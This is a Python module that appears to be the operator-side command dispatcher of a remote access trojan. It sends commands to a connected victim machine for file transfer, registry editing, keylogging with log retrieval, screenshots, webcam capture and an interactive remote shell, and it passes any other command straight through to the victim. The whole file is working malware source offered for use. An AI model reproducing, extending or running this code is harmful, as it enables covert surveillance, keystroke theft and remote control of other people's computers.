from .file_commands import handle_file_commands
from .key_commands import handle_key_commands
from .simple_commands import handle_simple_commands
from .system_commands import handle_system_commands

def execute_command(server, command):
    if not server.current_client_ip or not server.current_client_socket:
        return "No client connected."

    if command.startswith(('sendfile', 'download', 'upload')):
        return handle_file_commands(server, command)
    elif command.startswith(('setvalue', 'delkey', 'createkey')):
        return handle_key_commands(server, command)
    elif command.startswith(('keyscan_start', 'send_logs', 'stop_keylogger', 'sendmessage')):
        return handle_simple_commands(server, command)
    elif command in ['screenshot', 'webcam_snap', 'setwallpaper']:
        return handle_system_commands(server, command)
    elif command == 'shell':
        return shell_command(server)
    elif command == 'help':
        server.banner()
        return "Displayed help"
    else:
        # Handle other commands
        server.clients[server.current_client_ip].send(command.encode())
        result_output = server.clients[server.current_client_ip].recv(1024).decode()
        return result_output

def shell_command(server):
    server.clients[server.current_client_ip].send(b'shell')
    while True:
        command = input('>> ')
        server.clients[server.current_client_ip].send(command.encode())
        if command.lower() == 'exit':
            break
        result_output = server.clients[server.current_client_ip].recv(1024).decode()
        print(result_output)
    server.clients[server.current_client_ip].close()
    return "Shell session ended"
